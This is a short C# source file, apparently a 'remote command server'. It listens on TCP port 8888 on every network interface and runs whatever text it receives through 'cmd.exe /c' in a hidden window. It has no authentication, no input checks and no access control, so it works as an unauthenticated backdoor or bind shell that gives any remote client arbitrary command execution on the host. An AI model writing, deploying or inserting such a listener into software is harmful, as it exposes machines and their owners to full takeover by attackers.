using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;

namespace RemoteCommandServer
{
    class Program
    {
        static void Main(string[] args)
        {
            // Create a new server socket to listen for incoming connections
            Socket serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            serverSocket.Bind(new IPEndPoint(IPAddress.Any, 8888));
            serverSocket.Listen(10);

            // Loop indefinitely to accept incoming connections
            while (true)
            {
                Console.WriteLine("Waiting for connection...");

                // Accept the incoming connection
                Socket clientSocket = serverSocket.Accept();

                Console.WriteLine("Connection accepted from {0}", clientSocket.RemoteEndPoint);

                // Receive the command from the client
                byte[] buffer = new byte[1024];
                int bytesRead = clientSocket.Receive(buffer);

                string command = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                Console.WriteLine("Received command: {0}", command);

                // Execute the command
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command);
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;

                Process process = Process.Start(psi);
                process.WaitForExit();

                Console.WriteLine("Command executed");

                // Close the client socket
                clientSocket.Shutdown(SocketShutdown.Both);
                clientSocket.Close();
            }
        }
    }
}
